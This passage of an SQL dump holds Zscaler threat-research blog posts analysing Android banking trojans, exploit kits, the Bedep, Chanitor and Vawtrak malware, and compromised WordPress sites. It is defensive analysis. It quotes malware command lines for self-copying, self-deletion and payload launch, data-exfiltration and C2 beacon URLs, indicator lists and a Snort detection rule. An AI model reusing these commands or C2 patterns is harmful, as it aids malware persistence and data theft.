profit from compromised devices. Likewise, if a registrar or nameserver with poor reputation is found, specific actors will continue to leverage them until mitigations are put in place.', 'Exploit Kit;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/ongoing-angler-exploit-kit-and-bedep-fraud-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (159, 'Android Banking Trojan And SMS Stealer Floating In The Wild', 'Viral Gandhi', 'February 02, 2015', 'We recently came across an Android Banking Trojan with a very low antivirus detection rate that is targeting Chinese mobile users. This Android malware is capable of stealing banking information by intercepting SMS messages looking for certain keywords. It also steals all the contact information from the user\'s mobile device and relays it to a remote Command & Control (C2) server.    Malicious Android package details           	Name : 888.apk.  	MD5 :  ff081c1400a948f2bcc4952fed2c818b.  	VT : 7/56 (at the time of analysis)  	Source: http://wap{.}jhgxc{.}com/888.apk         Functionality           	 Intercept and capture all incoming and outgoing SMS messages  	 Intercept incoming calls and the ability to end calls  	 Receive C2 commands via SMS  	 Sends stolen data via SMS, e-mail, and possibly web requests to the C2 server      Let\'s take a look at some of the above mentioned malware features and how they have been implemented:           	  		  			  		  		  			Email sent SMS  		  	           In the screenshot above, you can see that it is e-mailing the captured outbound SMS messages using a hardcoded 163.com email address. It e-mails the stolen data to itself with the subject \"Send SMS\".         	  		  			  		  		  			Email and SMS all sniffed data  		  	                  Here you can see that it is e-mailing the captured inbound SMS messages using the same parameters that it used for outbound SMS messages. Additionally, it is also relaying the same information via SMS to a hardcoded Chinese phone number \"15996581524\".           	  		  			  		  		  			Intercepting call  		  	           The above screenshot shows the ability to intercept incoming calls and send the caller\'s number via e-mail with subject \"Intercept incoming call once the call!\". It also has the ability to end the call.           	  		  			  		  		  			Receives SMS as commands.  		  	               It\'s also capable of receiving C2 commands via SMS from the malware author to act further.         	  		  			  		  		  			Commands to act  		  	               As seen in the screenshot above, the attacker can start the data capturing activity by sending the SMS command \"intercept#\" and can also stop the capturing activity by sending SMS command \"interceptstop#\".           	  		  			  		  		  			Banking strings  		  	           In the screenshot above, you can see that there are string checks in place which are related to online banking transactions. It checks for strings like \"Pay\",\"Check\",\"Bank\",\"Balance\",\"Validation\"  which clearly shows the intent of the malware author to sniff banking related information.           	  		  			  		  		  			Setting high priorities  		  	               The malware sets the SMS receiver and outgoing call services to high priority. This will ensure that the malicious application will get a higher preference for these events compared to other applications.           	  		  			  		  		  			Web request for sending stolen contacts  		  	               We also saw some code that can allow the malware to send stolen contact information & SMS data through web requests. However, it appears to be non-functional in this version and the malware author might still be testing out this feature, as seen by the usage of the private IP address:     \"http://192.168.1.102/input/input_data_get_contact.asp?user=XXX&pwd=XXXX&addr=\"         	  		  			  		  		  			Web request for sending stolen SMS data  		  	               \"http://192.168.1.102/input/input_data_get_sms.asp?user=XXX&pwd=XXX&addr=XXX&id=XXX\"    The following are screenshots showing a sample of stolen information that the malware author has been able to capture through these malicious APK infections till now:         	  		  			  		  		  			Sent email section  		  	            	  		  			  		  		  			E-mailed stolen SMS message  		  	        	  		  			  		  		  			Intercepted incoming call notification  		  	             	  		  			  		  		  			SMS matching online banking strings  		  	                 	  		  			  		  		  			Stolen contact information  		  	               	  		  			  		  		  			Infected mobile users.  		  	        	  		  			  		  		  			Intercepted online banking SMS  		  	        	  		  			  		  		  			Intercepted online banking SMS  		  	           Here you can see some serious financial information sniffed by this malware illustrating the impact of such banking sniffers.         -Viral.', 'Malware;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/android-banking-trojan-and-sms-stealer-floating-wild');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (160, 'Exploit Kits: Anatomy Of A Silverlight Exploit', 'Uday Pratap Singh', 'January 30, 2015', 'With the significant adoption of Silverlight technology in today’s market, it has become one of the popular targets for the hacker community. We have observed many popular exploit kits (EKs) like Nuclear and Fiesta, serving specially crafted exploits targeting Silverlight vulnerabilities. Recently, we blogged about the Nuclear Exploit kit live infection cycle, which was leveraging Silverlight vulnerabilities to infect the victim’s computer. In this blog, we will take a look at the Silverlight exploit payloads and how they are embedded in the Exploit kit.      A Silverlight file is a zip archive with an \".xap\" extension and it is written in the .NET language. This XAP file contains a list of one or more .NET managed assemblies (.DLL files) along with the AppManifest.XAML file.      We have observed that Exploit kits are generally targeting following Silverlight vulnerabilities:        	CVE-2013-0074: Memory Dereference Arbitrary Code Execution Vulnerability.  	This vulnerability is due to an improper boundary checking of the user supplied input which leads to arbitrary code execution.        	CVE-2013-3896: Information (memory) disclosure Vulnerability  	By exploiting this vulnerability an unauthorized attacker can gain access to the sensitive information. This bug is used to bypass the exploit mitigation technologies.  	  	  	The following is a typical infection cycle involving Silverlight exploits in EKs:                               Dissection of the Infection Cycle and Silverlight Exploit:         As we discussed in our previous blog, the landing page of the Nuclear Exploit kit is heavily obfuscated to evade Anti-virus detection. The function highlighted below is invoking the Silverlight exploit:                  As we stepped through the deobfuscated code, we found that the exploit author has implemented multiple unused variables to possibly confuse analysts. We saw a parameter named “tuti” which contains the base64 encoded data that decodes the shellcode.                  Upon successful execution of the silver_run() function, the Exploit kit will download a malicious XAP file with the following GET request.                  The downloaded XAP exploit consists of three files as shown below.                  The AppManifest.xaml file contains the deployment details needed to run the Silverlight application. The first element of it starts with a deployment node which defines the Assembly information, Runtime version, Application Entry point and the assembly extension parts. In this file, There is an attribute called \'RuntimeVersion\' through which we can target a specific version of Silverlight. There are two other important attributes, namely EntryPointAssembly & EntryPointType which are mainly used for loading the XAP file.                  Reverse engineering the .NET DLL file is straightforward, because it is MSIL (Microsoft Intermediate Language) and there are multiple tools at our disposal. We used the Telerik JustDecompile tool to decompile the DLL. The following screenshot shows us the list of the classes used by the asdgsd.dll.             The screenshot below shows the entry point routine asdgsd.App. The constructor of asdgsd.App is used to call the shlyapa class.                  The following activity is performed by the shlyapa class which attempts to exploit multiple silverlight vulnerabilities:      	Get the .NET run time environment version and store it in the “mild” variable.  	Get the base64 encoded stream from aforementioned “tuti” parameter and store it in “brae” variable and invoke the \"dips\" function.  	In parallel, the function “lout” generates the “numArray” leveraging  class “chaiki”.  	  	                	    Function \"lout\" generates the \"BitmapImage\" instance by calling function \"game\" from \"alupka\"                                                   	The function \"huts\" is leveraging CVE 2013-3896 (A memory disclosure vulnerability in the public WritableBitMap class) to calculate the base-address of \"mscorlib.ni.dll\" as seen below:                                                                	Finally, the \"dips\" function executes the \"spca\" function that takes the base-address of \"mscorlib.ni.dll\" as an argument. The \"spca\" function is triggering CVE-2013-0074 (Dereference Vulnerability during HTML object rendering) as shown below:                   The following is a sample of live Nuclear Exploit Kit domains that we have seen in past 24 hours:           Nuclear EK Domains     indyresident[.]gq    macropromise[.]ml    hybridvertex[.]gq    macropromise[.]ga    uthunilaej[.]co[.]vu    daviddaniel[.]cf    brightrolling[.]ml    culturemerge[.]ga       Conclusion:        We continue to see the Silverlight vulnerabilities mentioned in this blog being exploited by many other popular exploit kits. Zscaler is actively monitoring and protecting end users against this threat.    Credit for Analysis & Guidance : Dhruval Gandhi', 'Exploit Kit;Vulnerability', 'https://www.zscaler.com/blogs/research/exploit-kits-anatomy-silverlight-exploit');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (161, 'Malvertising Leading To Flash Zero Day Via Angler Exploit Kit', 'Deepen Desai', 'January 22, 2015', 'UPDATE [01/25/2015]: Adobe released an update yesterday (APSA15-01) for CVE-2015-0311 that fixes the zero day exploit mentioned in this blog. Given the number of exploit attempts we are seeing for this vulnerability in the wild, it is critical for users to update the Adobe Flash player to the latest version 16.0.0.296.\r\n\r\nBackground\r\n\r\nEarlier this week, Kafeine published a blog mentioning an Angler Exploit Kit (EK) instance serving a possible zero day Adobe Flash exploit payload. The ThreatLabZ Research Team reviewed Angler Exploit Kit activity across the cloud and were able to identify multiple instances of Angler Exploit Kit hosting sites serving a new Adobe Flash payload that is able to exploit the latest Flash Player version 16.0.0.257.  [Adobe released a patch (APSB15-02) for CVE-2015-0310 today and we can confirm that the patch does not prevent exploitation of the 0day discussed in this blog. The latest version 16.0.0.287 is still vulnerable and is being actively exploited in the wild.]\r\n\r\nUpon further investigation, we discovered that this appears to be yet another case of a Malvertising campaign leading unsuspecting users to Angler EK instances. Upon successful exploitation, we observed a new variant of the Bedep Trojan getting dropped and executed on the victim machine. We tested this on a Windows 7 64-bit system and the payload dropped was a 64-bit Bedep Trojan variant which generated a high volume of AdFraud traffic from the infected system.\r\n\r\nThe affected advertising networks found in this case were:\r\n\r\n	oneclickads.net\r\n	adcash.com\r\n\r\nInfection Cycle\r\n\r\nThe infection cycle involves users visiting a legitimate site that displays certain advertisements from the compromised advertising networks, which will redirect them to an Angler EK hosting site and begin the exploit cycle. If the exploit is successful, a new variant of Bedep Trojan gets downloaded in an encrypted form and installed on the target system.\r\n\r\nThe entire infection cycle occurs silently in the background and is completely transparent to the end user.\r\n\r\n \r\n\r\nThe exploit page has the title \"Welcome to new site\" and is comprised of 220 hidden input elements, followed by three inline scripts.\r\n \r\n\r\n\r\n \r\n\r\nThe first script code snippet is obfuscated with block comment text (ie: /* random text */), but also appears purposefully broken for multiple JavaScript engines. Looking at the code, there are multiple period characters inserted throughout the script which leads to syntax errors at runtime:\r\n \r\n\r\n\r\n\r\n \r\n\r\nThe second script code snippet calls a function in the first script leading to \"eval\" and resulting in JavaScript code that performs Browser plugin detection:\r\n \r\n\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nThe third script code snippet drew our attention, as it is not obfuscated and simply loads an SWF object. This script serves the Adobe Flash 0-day and it is interesting to note that the script will only execute if the earlier script has thrown an error. The flash payload is only triggered if a variable defined in the first script is undefined:\r\n \r\n\r\n\r\n\r\n\r\nSuccessful exploitation will result in download of the Bedep Trojan payload that appears to be encrypted using an incremental XOR technique.\r\n\r\nMalware Payload activity - Bedep Trojan\r\n\r\nThe malware payload dropped is a 64-bit DLL belonging to Bedep Trojan family.  This malware family is known to download additional malware. It is also responsible for generating AdFraud and ClickFraud activity from the infected system.\r\n\r\nFile: neth.dll\r\nSize: 219608\r\nMD5: EFB584DEA6CBC03765487633BD5A5920\r\nCompiled: Wed, Nov 28 2007, 15:51:15  - 64 Bit DLL\r\nVersion: 5.3.3790.3959 (srv03_sp2_rtm.070216-1710)\r\n\r\nIt drops a copy of itself at the following locations:\r\n\r\nC:\\ProgramData\\{9A88E103-A20A-4EA5-8636-C73B709A5BF8}\\neth.dll\r\nC:\\Users\\All Users\\{9A88E103-A20A-4EA5-8636-C73B709A5BF8}\\neth.dll\r\n\r\nIt creates the following registry entries to achieve persistence in a discreet manner:\r\n\r\nHKLM\\SOFTWARE\\Classes\\CLSID\\{F6BF8414-962C-40FE-90F1-B80A7E72DB9A}\\InprocServer32\\: \"C:\\ProgramData\\{9A88E103-A20A-4EA5-8636-C73B709A5BF8}\\neth.dll\"\r\nHKLM\\SOFTWARE\\Classes\\CLSID\\{F6BF8414-962C-40FE-90F1-B80A7E72DB9A}\\InprocServer32\\ThreadingModel: \"Apartment\"\r\n\r\n\r\nHKU\\S-USERID-1000_Classes\\CLSID\\{F6BF8414-962C-40FE-90F1-B80A7E72DB9A}\\InprocServer32\\: \"C:\\ProgramData\\{9A88E103-A20A-4EA5-8636-C73B709A5BF8}\\neth.dll\"\r\nHKU\\S-USERID-1000_Classes\\CLSID\\{F6BF8414-962C-40FE-90F1-B80A7E72DB9A}\\InprocServer32\\ThreadingModel: \"Apartment\"\r\n\r\nThis ensures that it runs in the context of system process \"explorer.exe\":\r\n \r\n\r\n\r\nIt appears to determine the infected system\'s timezone and location by connecting to \"earthtools.org\", however we noticed that it is not able to supply the latitude and longitude parameters in the request, essentially resulting in getting back UTC date and time information.\r\n\r\nIt employs a Domain Generation Algorithm technique to hide the actual Command & Control server as seen below:\r\n \r\n\r\n\r\n \r\n\r\n \r\n We found the following two C&C domains registered in past 48 hours:\r\n \r\n\r\n	gaabbezrezrhe1k.com\r\n	wzrdirqvrh07.com\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nIt attempts to connect to these Command & Control servers to report the infection and receive further instructions. It presumably gets a list of ClickFraud tasking servers, following which we started seeing high volume of ClickFraud activity.\r\n \r\n\r\n \r\n\r\n \r\nConclusion\r\nThis is the first 0Day Adobe Flash Player exploit for year 2015 and not surprisingly, we are seeing it getting served through a malvertising campaign. The fact that the end malware payload getting served in this case is also involved in AdFraud activity leads us into believing that this campaign appears to be from a gang indulging in ClickFraud and AdFraud activity.\r\n\r\nZscaler ThreatLabZ has deployed multiple layers of protection against this threat to ensure that the customers are protected.\r\n\r\nAnalysis by Deepen Desai & John Mancuso', 'Click Fraud;Exploit Kit;Malware;Vulnerability;Zero Day', 'https://www.zscaler.com/blogs/research/malvertising-leading-flash-zero-day-angler-exploit-kit');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (162, 'Chanitor Downloader Actively Installing Vawtrak', 'ThreatLabz', 'January 09, 2015', 'We at ThreatLabZ are keeping an eye on a fairly active downloader called Chanitor. This malware is being delivered via phishing emails purporting to be \"important\" documents, for example, voicemails, invoices, and faxes; all are actually screensaver executables with the extension ‘.scr’. Another unique feature of this downloader Trojan family is the usage of tor2web.org and tor2web.ru over SSL for its Command & Control (C2) communication.\r\n \r\n\r\nUpon execution, Chanitor copies itself to ‘%APPDATA%\\Roaming\\Windows\\winlogin.exe’ by running the following command:\r\n\r\n \r\n\r\ncmd /D /R type \"C:\\<path-to-binary>\\winlogin.exe\" > ___ && move /Y ___ \"C:\\Users\\<username>\\AppData\\Roaming\\Windows\\winlogin.exe\"\r\n\r\n \r\n\r\nIt then waits for a few seconds before deleting the original file, and executes the copy via the following command:\r\n \r\n\r\ncmd /D /R ping -n 10 localhost && del \"C:\\<path to original exe>\" && start /B \"\" \"C:\\Users\\<username>\\AppData\\Roaming\\Windows\\winlogin.exe\" && exit\r\n \r\n\r\nOnce the command executes, it creates a registry entry for persistence:\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\nChanitor encrypts some key components like C2 server locations that is decrypted only when used on run time. For example, \"tor2web.org\" is decrypted using a xor loop:\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\nThe next step is enumeration of functions for making outbound SSL connections and making connections to the command and control server. These connections are shown in the screenshot below.\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\nThe first connection (#1 above) is to retrieve the public IP of the infected host. The success or failure of this request isn’t checked though, so the next request happens regardless. This request (#2) is a beacon to the command and control server on TOR via tor2web.org. Chanitor uses SSL for all communication and beacons via POST requests to /gate.php. If the request is successful, the C2 server will provide further instructions which during our analysis was to download additional binary payload. The download is shown in session #3 above. Once the download finishes, there is a subsequent beacon which presumably means success (#4). Strangely enough, there is a failed request to tor2web.ru (#5). This domain does not exist, so the purpose of this request is unknown.\r\n\r\nThe screenshot below shows detail of the initial beacon (#2) and server response to download a stage 2 binary:\r\n\r\n \r\n\r\n\r\nEach beacon takes the following form:\r\n{<MALWARE GENERATED UNIQUE IDENTIFIER>}<SHORT STRING><4 SPACE PADDING>}<USERDOMAIN><58 SPACE PADDING>}<IP ADDRESS>\r\n\r\n\r\nIf the request to api.ipify.org is unsuccessful, the IP address will be the machine\'s RFC1918 address instead of a public IP. The C2 server replies with an instruction to download a file (highlighted in red above) and the download is initiated immediately. The beacon information, with the exception of the IP address, is also stored in the registry:\r\n\r\n\r\n\r\n\r\nAfter downloading and reporting success, the original binary will then sleep for approximately 5 minutes (there\'s some variation for slightly longer and slightly shorter) before beaconing again:\r\n\r\n\r\n\r\n \r\n\r\nDownloaded Binary\r\n\r\n\r\nThe downloaded binary is a dropper Trojan and is saved as C:\\Users\\<username>\\AppData\\Local\\Temp\\__<4 alphanumeric characters>.exe. Chanitor will run the downloaded payload via the following command:\r\n\r\ncmd /D /R start /B \"\" \"C:\\Users\\<username>\\AppData\\Local\\Temp\\___16AE.exe\" && exit\r\n\r\n\r\nUpon execution, the binary checks for the presence of a debugger. If no debugger is found, the binary then unpacks an embedded DLL and writes it to disk. This DLL is a new variant of the Vawtrak Trojan.\r\n\r\n\r\n \r\n\r\n\r\n\r\nThe DLL is registered with regsvr32.exe via the following command to ensure persistence:\r\n \r\n\r\n\r\n\r\n\r\nThe Vawtrak dropper Trojan then deletes itself from the target system. The Vawtrak dropper binary and the DLL are compressed using aPLib v1.01 library as seen below:\r\n\r\n\r\n\r\nVawtrak, also known as NeverQuest and Snifula, is a powerful information stealing backdoor Trojan that has been gaining momentum over past few months. It primarily targets user\'s bank account via online banking websites.\r\n\r\nIndicators of Compromise\r\n\r\nC2 Domains\r\nhttps://svcz25e3m4mwlauz.tor2web[.]org/gate.php\r\nhttps://ho7rcj6wucosa5bu.tor2web[.]org/gate.php\r\nhttps://o3qz25zwu4or5mak.tor2web[.]org/gate.php\r\nhttps://lctoszyqpr356kw4.tor2web[.]org/gate.php\r\n\r\nFile Locations\r\n\r\nC:\\Users\\<username>\\AppData\\Roaming\\Windows\\winlogin.exe\r\n\r\nC:\\ProgramData\\TigaPjopw\\VofcOhhel.zvv -- these names appear random\r\n\r\nC:\\Users\\<username>\\AppData\\Local\\Temp\\~004BFD62.tmp -- this name appears random\r\n\r\nC:\\Users\\<username>\\AppData\\Local\\Temp\\___16AE.exe -- this name appears random\r\n\r\nConclusions\r\n\r\nThe samples collected date back to the beginning of October 2014 and have changed in measurable ways over the past few months. The first samples would not run on Windows 7 unless in compatibility mode, required administrative privileges, and did not have icons that matched the purported filetype or theme, but the recent samples have evolved to run without errors and appear to be more refined. We attempted to contact tor2web at abuse@tor2web.org and at info@tor2web.org and received bouncebacks followed a few days later by a delivery failure notification. Since the C2 servers are hosted on TOR, tracking the individuals behind this campaign may prove difficult, but blocking access to tor2web would be effective for the time being.', 'Malware', 'https://www.zscaler.com/blogs/research/chanitor-downloader-actively-installing-vawtrak');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (163, 'Compromised Wordpress Sites Serving Multiple Malware Payloads', 'Rubin Azad', 'December 21, 2014', 'During our daily log monitoring process, we observe many interesting threat events. One such event led to a compromised WordPress site campaign, which was found to serve multiple malware families including Upatre/Hencitor/Extrat Xtreme RAT/Vawtrak. The URLs which were serving malware were found to adhere to a particular pattern. Infected WordPress sites observed, included URLs with \"/1.php?r”. Emerging Threats (ET) had previously released a Snort signature for this campaign on 12/08/2014. Since then, we have been continuously monitoring the activities related to it. The following is the snort signature released by ET.       	  		  			Snort Signature  		  		  			alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"ET  			CURRENT_EVENTS Probable malicious download from e-mail link /1.php\";  			flow:established,to_server; urilen:8; content:\"/1.php?r\"; http_uri;  			content:!\"Referer|3a 20|\"; http_header;  			flowbits:set,et.exploitkitlanding; classtype:bad-unknown; sid:2019894;  			rev:1;)  		  	      Below are the compromised websites observed, which have been found to be serving multiple malware families.       	  		  			Compromised wordpress websites  		  		  			airlessspraysupplies[.]com/wp-includes/1[.]php?r  		  		  			altero[.]be/1[.]php?r  		  		  			alzina[.]cat/1[.]php?r  		  		  			angeladoesfood[.]com/wp-admin/1[.]php?r  		  		  			apsmiles[.]com/wp-content/themes/rfx/1[.]php?r  		  		  			architecture[.]web[.]auth[.]gr/1[.]php?r  		  		  			augustgifford[.]com/wp-admin/1[.]php?r  		  		  			bankruptcy-software[.]com/wp-content/themes/classic/1[.]php?r  		  		  			bernie[.]jshall[.]net/wp-content/themes/twentytwelve/1[.]php?r  		  		  			beta[.]pescariusports[.]ro/images/1[.]php?r  		  		  			blackwellanddenton[.]com/components/com_contact/1[.]php?r  		  		  			blog[,]longboardsicecream[.]com/wp-content/plugins/1[.]php?r  		  		  			blog[.]ridici-jednotky[.]cz/wp-content/plugins/simple4us/1[.]php?r  		  		  			blog[.]topdealslondon[.]com/wp-content/uploads/1[.]php?r  		  		  			cartorioalbuquerque[.]com[.]br/images/1[.]php?r  		  		  			climatechange[.]mobi/images/1[.]php?r  		  		  			core[.]is/1[.]php?r  		  		  			couponshare[.]me/1[.]php?r  		  		  			dannygill[.]co[.]uk/wp-content/plugins/simple4us/1[.]php?r  		  		  			dlaciebie[.]org/wp-admin/1[.]php?r  		  		  			geototal[.]az/en/ru/engine/editor/scripts/common/codemirror/mode/xml/1[.]php?r  		  		  			kba1f9684c70[.]nazwa[.]pl/images/1[.]php?r  		  		  			linkleads[.]vn/1[.]php?r  		  		  			lionel[.]my/wp-content/plugins/akismet/1[.]php?r  		  		  			livedoor[.]eu/1[.]php?r  		  		  			ludovicharollais[.]org/wp-admin/1[.]php?r  		  		  			m11[.]mobi/images/1[.]php?r  		  		  			matthewkarant[.]com/wp-content/themes/twentynine/1[.]php?r  		  		  			mcymbethel[.]com[.]ar/modules/mod_ariimageslider/1[.]php?r  		  		  			merklab[.]eu/1[.]php?r  		  		  			mitoyotaseagarrota[.]com/components/com_banners/1[.]php?r  		  		  			mlmassagetherapy[.]com[.]au/wp-content/uploads/1[.]php?r  		  		  			monitoring[.]sensomedia[.]hu/1[.]php?r  		  		  			newwww[.]r11mis[.]be/images/1[.]php?r  		  		  			odelia-coaching[.]co[.]il/wp-content/plugins/google-sitemap-generator/1[.]php?r  		  		  			odelia-coaching[.]co[.]il/wp-content/plugins/google-sitemap-generator/1[.]php?r  		  		  			osp[.]ruszow[.]liu[.]pl/images/1[.]php?r  		  		  			pms[.]isovn[.]net/images/1[.]php?r  		  		  			prodvizhenie-sajta[.]com/images/1[.]php?r  		  		  			redmine[.]sensomedia[.]hu/1[.]php?r  		  		  			salihajszalon[.]hu/1[.]php?r  		  		  			sonicboommusic[.]com[.]au/components/com_banners/1[.]php?r  		  		  			sparkledesign[.]ro/1[.]php?r  		  		  			thebestcookbooks[.]co[.]uk/wp-content/plugins/1[.]php?r  		  		  			thefoodstudio[.]co[.]nz/wp-content/themes/food-cook/1[.]php?r  		  		  			thietkekientruca4[.]vn/1[.]php?r  		  		  			treasurething[.]com/wp-includes/pomo/1[.]php?r  		  		  			tsv-penzberg[.]de/wp-admin/1[.]php?r  		  		  			turbomarketingteam[.]com/1[.]php?r  		  		  			tusengangerstarkare[.]ingelaclarin[.]se/wp-admin/1[.]php?r  		  		  			twobyones[.]com/1[.]php?r  		  		  			xhmeiastokyma[.]gr/1[.]php?r  		  		  			youreverlastingmemories[.]co[.]uk/1[.]php?r  		  	      These compromised WordPress sites may have been used by Exploit Kit (EK) authors as drop sites for serving malware. Another potential attack vector could involve email spam.    The following table shows different types of malware we have seen dropped from the aforementioned compromised sites. All malware was found to be zipped.           	  		  			ZIP MD5  			ZIPFILE NAME  		  		  			2f225283c66032c9f7dcb44f42697246  			fax_20141204_385.pdf.zip  		  		  			6696527bfda97b1473d1047117ded8d6  			invoice.pdf.zip  		  		  			93babef06bfd93bcbb5065c445fb57d4  			label_08122014_23.pdf.zip  		  		  			bea9be813bb7df579d5be3e4543dc6a4  			payment_details9427923.pdf.zip  		  		  			1159fe7ec4d0b2cfde57dfb28b98f0c9  			ePackage_12092014_42.pdf.zip  		  		  			038710b2029046c39ca4082e2c34f9b3  			wav_voice20141208.zip  		  		  			ec35acdbe331c73e5e6883ebc08f896d  			payment_invoice_182734.pdf.zip  		  		  			8f00cfdf067b01462670212ba5874cdb  			pdf_efax_9823612397.zip  		  	      Lets take a look at the files after unzipping them. All of the files are Windows screen savers and include fake icons of legitimate software packages, to persuade the victims to click on them.    Downloaded files:         For this post we\'ve chosen to focus on the Hencitor malware. Hencitor’s typical behavior is to download additional malware onto the victim’s machine and execute it.     MD5: 6bb3b23ff3e736d499775120aa8d6ae2  VT Score: 9/56 (At the time of analysis)    Lets take a look at some important things noted while conducting dynamic analysis of this malware.                	Copies itself to   	  		\"C:\\Users\\Win7 64Bit\\AppData\\Roaming\\Windows\\winlogin.exe”  	  	  	Creates autostart registry key entry  	  		HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run  		  			\"winlogin” = \"C:\\Users\\Win7 64Bit\\AppData\\Roaming\\Windows\\winlogin.exe”  		  		  	  	  	Uses ping.exe to check the status of other devices and networks.  	  		cmd /D /R ping -n 10 localhost && del C:\\payment_invoice_182734.pdf.scr.exe && start /B C:\\Users\\Win7 64Bit\\AppData\\Roaming\\Windows\\winlogin.exe && exit  	  	  	Creates a thread in following existing process on the system.  	  		C:\\Windows\\explorer.exe  		C:\\Windows\\System32\\sppsvc.exe  		C:\\Windows\\System32\\wbem\\WmiPrvSE.exe  		C:\\Windows\\System32\\conhost.exe  	  	  	Deletes itself after installation   	  		c:\\payment_invoice_182734.pdf.scr.exe  	  	  	Malware seen to resolve couple of suspicious tor sites.   	  		o3qz25zwu4or5mak.tor2web[.]org   		o3qz25zwu4or5mak.tor2web[.]ru   	  	    Conclusion:         Compromising vulnerable WordPress sites to spread malware has become one of the more widely used attack vectors by EK’s and email spam campaigns. Such campaigns generally drop variants of well known malware families,  which are undetected by the AV vendors. By the time of analysis we observed poor detection rates for the malware samples involved in this campaign.    -Stay Safe', 'Malware', 'https://www.zscaler.com/blogs/research/compromised-wordpress-sites-serving-multiple-malware-payloads');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (164, 'Top Security Features Added To Android Lollipop', 'Viral Gandhi', 'December 21, 2014', 'As Google officially rolls out it\'s new operating system Lollipop, let\'s review some of the enhanced security features added to Android 5.0.\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Lollipop\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nKill switch\r\n\r\nThe most interesting new security feature is the Factory Reset Protectionoption, which is also known as the “kill switch.” To aid corporate and personal users dealing with stolen devices, the personal data stored within the device can now be remotely wiped and the phone made inoperable. With reports suggesting that over 3 million Americans had their smart phones stolen last year, it\'s easy to see why Google has added this feature to Lollipop.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Device management.\r\n		\r\n	\r\n\r\n\r\nEncryption on the fly\r\n\r\nAnother valuable security feature available in Lollipop is default encryption. Although not an entirely new feature as previous Android did offer encryption, it needed to be explicitly enabled by the user. With Lollipop, the initial boot will prompt users to activate encryption. Thereafter, new data will be encrypted on the fly.\r\n\r\n \r\n\r\nImproved malware protection and sandboxing\r\n\r\nLollipop is armed with SELinux (Security Enhanced Linux), which aims to provide enhanced protection against malware and vulnerabilities. This feature ensures secure app isolation, which helps to keep private data secure should the device be compromised. \r\n\r\n \r\n\r\nSmart Device Lock\r\n\r\nThe real privacy danger for most users is simply leaving a device unlocked and then having someone else gain access to personal data and open social profiles. Locking phone features should not be a tedious task that users avoid. Lollipop therefore introduces a new feature called Smart Lock to help combat this problem.\r\n \r\n\r\nSmart Lock adds the ability to set trusted locations such as home or the office, where your device will open automatically once you enter that region. You can do the same in conjunction with specific Bluetooth and NFC enabled Android Wear smart watches. When sensing these trusted devices, Lollipop phones/tablets will lower their security shields as the owner is presumably present. Users are also able to set notification access prior to a security lock to allow actions such as sending a message.\r\n\r\n \r\n\r\nMultiple User Profiles\r\n\r\nAs Internet social profiles and personal data like photos and contacts are generally the most sensitive information for a user, lending a phone to another person creates a security risk. Lollipop solves this issue by permitting multiple user profiles. Users can create a different guest profile which has limited access. The Owner account has access to the entire device and everything within it, as well as control over other profiles on the device. A User account, on the other hand, has limited access to certain apps and content controlled by the device’s main user, as well as limited calling and SMS capabilities. This feature is also beneficial for parents who can give their phone to their kids and only grant them access to a specific app or a game that they want them to play and nothing else on the device.\r\n \r\n\r\nWant to scan Android apps for security and privacy issues? Try ZAP.', 'Malware;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/top-security-features-added-android-lollipop');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (165, 'Trojanized And Pirated Assassins Creed App', 'Viral Gandhi', 'December 11, 2014', 'During our daily research, we recently came across Android malware disguising itself as an Assassins Creed app, which is a popular paid gaming application. The malware in question will install a pirated version of the Assassins Creed game that functions normally, making end user oblivious to the malicious activities it performs in background.         Application information:           	File MD5 : 3E076979644672A0EF750A4C3226F553  	File Size : 3.25 MB  	File Name : assassins_creed.apk  	Package Name : com.dsifakf.aoakmnq         Permissions:           	android.permission.ACCESS_NETWORK_STATE  	android.permission.GET_ACCOUNTS  	android.permission.INTERNET  	android.permission.PROCESS_OUTGOING_CALLS  	android.permission.READ_EXTERNAL_STORAGE  	android.permission.READ_PHONE_STATE  	android.permission.READ_SMS  	android.permission.RECEIVE_BOOT_COMPLETED  	android.permission.RECEIVE_SMS  	android.permission.SEND_SMS  	android.permission.WAKE_LOCK  	android.permission.WRITE_EXTERNAL_STORAGE  	android.permission.WRITE_SMS      The malicious application is capable of sending multi-part text messages, harvesting text messages from a victim\'s device, and sending stolen information to a remote Command & Control (C2) server. We were able to locate phone numbers belonging to Russian bank \"Volga-Vyatka Bank of Sberbank of Russia\" in the malicious application code for which SMS messages are being intercepted to steal sensitive information. Another interesting feature we saw is the usage of AES encryption for all the C2 communication. It also harvests the mobile number and Subscriber ID information from the victim device for tracking purposes.    The screenshot below shows the AES crypto library configurations. All the sensitive harvested data and C2 communication is encrypted and decrypted using this configuration.                Code snippet showing the string containing the Russian Bank phone numbers:                              Command and Control server information in encrypted and decrypted form:                      We saw the following two command and control servers hardcoded in the malicious application:           	 bnk7ihekqxp.net  	 googleapiserver.net                  The screenshot above shows the usage of AES for C2 communication. A sample call back request from the infected device will be of the following format:    \"http://bnk7ihekqxp[.]net/iaefu.php?1=4fe08eb4b43XXXXXXXX&id=X\".    The code snippet below shows the SMS and Subscriber ID 